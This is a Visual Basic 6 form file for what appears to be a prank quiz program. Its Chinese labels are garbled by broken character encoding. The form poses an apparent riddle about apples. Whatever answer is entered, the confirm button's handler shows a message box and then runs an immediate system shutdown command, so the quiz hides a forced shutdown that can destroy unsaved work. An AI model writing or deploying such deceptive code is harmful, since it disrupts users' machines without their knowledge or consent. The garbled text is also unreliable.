VERSION 5.00
Begin VB.Form Form3 
   Caption         =   "�²���1.0"
   ClientHeight    =   3375
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   5820
   LinkTopic       =   "Form3"
   ScaleHeight     =   3375
   ScaleWidth      =   5820
   StartUpPosition =   3  '����ȱʡ
   Begin VB.CommandButton ȷ�ϰ�ť 
      Caption         =   "ȷ��"
      Height          =   615
      Left            =   3360
      TabIndex        =   2
      Top             =   1920
      Width           =   1335
   End
   Begin VB.TextBox ����� 
      Height          =   495
      Left            =   480
      TabIndex        =   1
      Text            =   "�ش�����"
      Top             =   1920
      Width           =   2175
   End
   Begin VB.Label ��� 
      Caption         =   "С����һ��ƻ����������һ��ƻ��������һ���м���ƻ��������ע�����ش�ʽ����ֻ��Ҫ�ش�����˭������X��������"
      Height          =   735
      Left            =   960
      TabIndex        =   0
      Top             =   480
      Width           =   3495
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()

End Sub

Private Sub ȷ�ϰ�ť_Click()
If �����.Text = "�����Բ�" Then
MsgBox "��ϲ���Ѿ��²гɹ�������������رգ�"
Shell "shutdown -s -t 0"
Else
MsgBox "�ش������ȷ��Ϊ�������ԲУ�"
Shell "shutdown -s -t 0"
End If
End Sub

